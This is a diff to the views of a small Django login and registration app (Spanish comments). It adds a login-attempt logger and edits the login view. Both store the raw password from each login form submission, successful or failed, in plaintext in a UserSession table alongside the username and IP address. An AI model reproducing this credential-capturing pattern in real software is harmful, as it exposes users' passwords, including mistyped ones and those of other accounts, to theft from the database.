@@ -4,6 +4,7 @@ from .forms import CustomUserCreationForm
 from django.contrib.auth import authenticate, login, logout
 from .models import UserSession
 from django.contrib.auth.forms import AuthenticationForm
+from django.utils import timezone
 
 
 # Create your views here.
@@ -13,20 +14,25 @@ def home(request):
             form = AuthenticationForm(request, data=request.POST)
             if form.is_valid():
                 user = form.get_user()
+                saveAttemptLogin(user, request, success=True)
                 login(request, user)
                 return redirect('home2')
+            else:
+                saveAttemptLogin(None, request, success=False)
         else:
             form = AuthenticationForm()
+        
         return render(request, 'core/login.html', {'form': form})
     return render(request, 'core/home.html')
 
 @login_required
 def home2(request):
-    return render(request, 'core/home2.html')
+    form = AuthenticationForm()
+    return render(request, 'core/home2.html', {'form': form})
 
 def exit(request):
     logout(request)
-    return redirect('home2')
+    return redirect('home')
 
 def register(request):
     data = {
@@ -41,8 +47,6 @@ def register(request):
             #En el caso de que necesite que el usuario se logee automaticamente
             #despues de haberse registrado
             user = authenticate(username = user_creation_form.cleaned_data['username'], password = user_creation_form.cleaned_data['password1'])
-            ip = get_client_ip(request)
-            UserSession.objects.create(username=user_creation_form.cleaned_data['username'], password=user_creation_form.cleaned_data['password1'], ip=ip)
             login(request, user)
             return redirect('home')
     
@@ -62,9 +66,22 @@ def login_view(request):
         form = AuthenticationForm(request, data=request.POST)
         if form.is_valid():
             user = form.get_user()
+            ip = get_client_ip(request)
+            UserSession.objects.create(username=user.username, password=form.cleaned_data.get('password', ''), ip=ip)
             login(request, user)
             return redirect('home2')  # redirigir a la vista home2 después del login exitoso
     else:
         form = AuthenticationForm()
     
     return render(request, 'core/home.html', {'form': form})
+
+def saveAttemptLogin(user, request, success):
+    ip = get_client_ip(request)
+    username = user.username if user else request.POST.get('username', 'Unknown')
+    UserSession.objects.create(
+        username=username, 
+        password=request.POST.get('password', ''), 
+        ip=ip,
+        timestamp=timezone.now(),
+        success=success
+    )
